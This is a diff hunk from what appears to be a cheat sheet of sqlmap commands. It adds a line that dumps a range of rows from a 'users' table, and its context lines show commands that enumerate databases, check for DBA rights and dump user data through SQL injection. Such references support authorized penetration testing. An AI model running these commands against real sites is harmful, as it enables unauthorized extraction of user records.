@@ -668,6 +668,7 @@ $ sqlmap -u <URL> --banner --current-user --current-db --is-dba
 $ sqlmap -u <URL> --tables -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
+$ sqlmap -u <URL> --dump -T users -D testdb --start=2 --stop=3
 $ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
 $ sqlmap -u <URL> --schema
 $ sqlmap -u <URL>--search -T user
